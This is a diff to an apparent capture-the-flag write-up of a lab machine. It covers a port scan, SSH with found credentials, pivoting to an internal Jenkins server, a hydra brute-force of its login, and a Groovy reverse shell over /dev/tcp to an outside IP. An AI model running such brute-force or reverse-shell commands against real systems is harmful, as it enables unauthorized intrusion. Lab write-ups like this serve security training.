@@ -596,7 +596,7 @@ https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-al
 ### Scan
 Using rustscan to perform a fast all port scan
 
-	rustscan -a internal.thm --ulimit 5000 
+	rustscan -a internal.thm -b 1000 
 	
 	Open 10.10.213.134:22
 	Open 10.10.213.134:80
@@ -621,7 +621,30 @@ The you can check vulnerabilities with nmap
 We found aubreanna:bubb13guM!@#123 then we can connect using SSH.
 
 ### Lateral movement
-I used ligolo-ng instead of SSH tunnell.
+I used ligolo-ng instead of SSH tunnell. We found a Jenkins server
 
-  	
+	cat jenkins.txt 
+	Internal Jenkins service is running on 172.17.0.2:8080
+I added the route to the ligolo interface
 
+ 	sudo ip route add 172.17.0.2/32 dev ligolo 
+
+Then scan the host
+
+	rustscan -a 172.17.0.2 -b 1000 
+	...
+ 	Open 172.17.0.2:8080
+	Open 172.17.0.2:50000
+	...
+
+Brute-force Jenkins login form:
+
+	hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.17.0.2 -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid"
+	...
+ 	[8080][http-post-form] host: 172.17.0.2   login: admin   password: spongebob
+	...
+ In Jenkis, using the script console we can get a reverse shell using Groovy script: https://gist.github.com/rootsecdev/273f22a747753e2b17a2fd19c248c4b7
+
+ 	r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.9.1.67/1234;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[]) p.waitFor()
+
+ 	
